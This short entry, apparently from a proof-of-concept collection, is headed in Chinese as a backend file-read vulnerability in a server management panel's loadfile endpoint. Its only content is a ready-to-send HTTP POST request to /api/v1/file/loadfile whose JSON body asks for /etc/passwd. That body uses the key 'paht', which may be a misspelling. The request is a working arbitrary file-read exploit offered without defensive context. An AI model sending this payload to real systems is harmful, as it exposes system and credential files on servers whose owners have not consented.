## Panel loadfile 后台文件读取漏洞
```
POST /api/v1/file/loadfile
{"paht":"/etc/passwd"}
```
